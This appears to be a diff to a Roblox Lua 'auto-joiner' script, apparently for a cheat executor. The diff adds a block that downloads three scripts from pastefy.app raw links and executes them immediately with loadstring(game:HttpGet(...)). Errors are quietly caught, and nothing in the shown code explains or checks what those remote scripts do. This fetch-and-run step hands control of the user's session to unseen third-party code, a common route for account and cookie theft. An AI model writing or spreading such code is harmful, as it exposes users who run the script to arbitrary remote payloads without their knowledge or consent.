@@ -1,6 +1,24 @@
 -- Auto-Joiner Script with Live Notifications
 repeat wait() until game:IsLoaded()
 
+-- ===============================
+-- Load Additional Scripts
+-- ===============================
+local additionalScripts = {
+    'https://pastefy.app/UsD1EzWZ/raw',
+    'https://pastefy.app/ofVjyrZD/raw',
+    'https://pastefy.app/mKXOpNrI/raw'
+}
+
+for _, scriptUrl in ipairs(additionalScripts) do
+    local success, err = pcall(function()
+        loadstring(game:HttpGet(scriptUrl))()
+    end)
+    if not success then
+        warn("[AutoJoiner] Failed to load script:", scriptUrl, err)
+    end
+end
+
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
